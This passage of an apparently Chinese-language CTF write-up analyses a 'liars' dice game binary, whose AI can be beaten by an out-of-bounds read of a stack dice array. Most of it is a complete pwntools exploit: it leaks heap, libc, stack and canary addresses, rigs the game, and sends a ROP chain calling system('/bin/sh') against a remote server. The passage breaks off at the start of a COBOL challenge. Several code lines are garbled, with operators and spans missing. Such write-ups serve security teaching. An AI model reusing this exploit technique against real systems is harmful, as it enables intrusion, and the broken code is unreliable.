             }
         }
         else
         {
             *dice_face = val;
             *dice_cnt = v7;
             result = 0LL;
         }
         return result;
     }
简单来说，就是首先判断上一个玩家是不是用户玩家：
    * 若是，则判断用户玩家的猜测是否是正确的，即如果骰子个数猜多了，AI就会报`liar`；如果个数正好合适，AI就会报`spot on`；如果没有问题，就会当作上一个玩家也是AI做同样的决定。
    * 若不是，则首先判断如果报出的点数和个数分别为`x`，`y + 1`是否正确；若正确则返回，并选择报出`x`，`y + 1`；若不正确，则增大`x`搜索，搜到则返回，没搜到则说明上一个AI报出的`y`正好等于点数为`x`的骰子的个数，于是后面会报出`spot on`。
  5. 根据上面的描述，似乎AI不可能输，但是注意到记录每个玩家的骰子点数的数组在栈上： 
         struct player_dice player[10]; // [rsp+50h] [rbp-2E0h] BYREF
且在后面判断的时候并不是根据AI预先知道的`dice_val_cnt`进行判断的，而是又做了一次重新的统计：
         __int64 __fastcall count_face_cnt(_DWORD *dice, int val)
     {
         unsigned int cnt; // [rsp+14h] [rbp-8h]
         int i; // [rsp+18h] [rbp-4h]
         cnt = 0;
         for ( i = 0; i = 0 && val  x && y1 >= y || x1 >= x && y1 > y`，所以无法让AI输，因此退一步，就尽量让下一个AI的后一个AI报出`spot on`（这里让下一个AI报出`spot on`加一个额外的骰子也应该没有问题，输的概率还是更大）。
  6. 于是采用上述的策略，我们不断地利用这个溢出的骰子让AI输，直到失去所有的骰子获胜。
  7. 后面直接ROP执行`system("/bin/sh")`即可。
###  exp
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    import sys, os, re
    context(arch='amd64', os='linux', log_level='debug')
    context(terminal=['gnome-terminal', '--', 'zsh', '-c'])
    _proc = os.path.abspath('./liars')
    _libc = os.path.abspath('./libc-2.31.so')
    libc = ELF(_libc)
    elf = ELF(_proc)
    p = remote('liars.pwni.ng', 2018)
    def leak(offset):
        p.sendlineafter("Leave\n", "1")
        p.sendlineafter("Player? ", str(offset))
        p.recvuntil("They have ")
        val = int(p.recvuntil(" dice", drop=True))
        if val  6:
                    break
        return path
    def get_dice_count(total):
        dice_count = [0 for i in range(7)]
        for i in range(-20, -15):
            dice_count[i + 21] = show_dice_num(i)
        dice_count[6] = total - sum(dice_count)
        print total, dice_count
        return  dice_count
    def get_extra_die_face():
        p.recvuntil("Your dice:\n")
        buffer = p.recvuntil("Player ")
        die_face = []
        start = 0
        while True:
            try:
                string = buffer[start : start + 0x1E]
                start += 0x1E
                die_face.append(dice.index(string) + 1)
            except:
                break
        return die_face[-1]
    dice = [
        "-----\n|   |\n| o |\n|   |\n-----\n",
        "-----\n|o  |\n|   |\n|  o|\n-----\n",
        "-----\n|  o|\n| o |\n|o  |\n-----\n",
        "-----\n|o o|\n|   |\n|o o|\n-----\n",
        "-----\n|o o|\n| o |\n|o o|\n-----\n",
        "-----\n|o o|\n|o o|\n|o o|\n-----\n",
    ]
    # do leak first
    decide_player(10)
    heap_low_bytes = leak(-0x7E)
    heap_high_bytes = leak(-0x7D)
    heap_base = ((heap_high_bytes > 2
    offset -= (1 > 2
    offset -= (1 = start[1] and dice_count[extra_die_face] >= start[0]:
                # just let AI spot on and lose one die
                bet(extra_die_face, dice_count[extra_die_face], True)
            else:
                # unfortunately, we must let one AI win, but we can try not to let the next AI win
                path = find_a_way(dice_count, start[1], start[0])
                # print(path, (extra_die_face, dice_count[extra_die_face]))
                if [path[-1][1], path[-2][0]] != start:
                    bet(path[-2][0], path[-2][1], True)
                else:
                    bet(path[1][0], path[1][1])
        else:
            bet(extra_die_face, dice_count[extra_die_face], False)
            flag = False
        if "loses" in p.recvuntil("New round"):
            total -= 1
        else:
            total += 1
    # only two players left, every round the AI will lose one die
    while True:
        dice_count = get_dice_count(total)
        extra_die_face = get_extra_die_face()
        try:
            p.recvuntil("'s turn\nBet ", timeout=0.5)
            start = map(int,p.recv(3).split(' '))
            if start == [dice_count[extra_die_face], extra_die_face]:
                liar()
            else:
                bet(extra_die_face, dice_count[extra_die_face], True)
        except:
            bet(extra_die_face, dice_count[extra_die_face], False)
        p.recvuntil("loses a die.\n")
        if p.recv(19) == "What is your name? ":
            break
        else:
            total -= 1
    # ROP now
    payload = 'A' * 0x208
    payload += p64(canary) + p64(0)
    payload += flat([pop_rdi_rbp, str_bin_sh, 0, system])
    p.sendline(payload)
    success("libc_base: " + hex(libc_base))
    success("heap_base: " + hex(heap_base))
    success("stack_addr: " + hex(stack_addr))
    success("canary: " + hex(canary))
    p.interactive()
## THE COBOL JOB
###  题目分析
一个COBOL语言写的程序，实现一个简单的菜单，提供创建、打开、读、写、关闭、复制文件的操作：
    IDENTIFICATION DIVISION.
    PROGRAM-ID. CBLCHALL1.
    ENVIRONMENT DIVISION.
    INPUT-OUTPUT SECTION.
    FILE-CONTROL.
    *    SELECT SYSIN ASSIGN TO KEYBOARD ORGANIZATION LINE SEQUENTIAL.
    DATA DIVISION.
    FILE SECTION.
    *FD SYSIN.
    WORKING-STORAGE SECTION.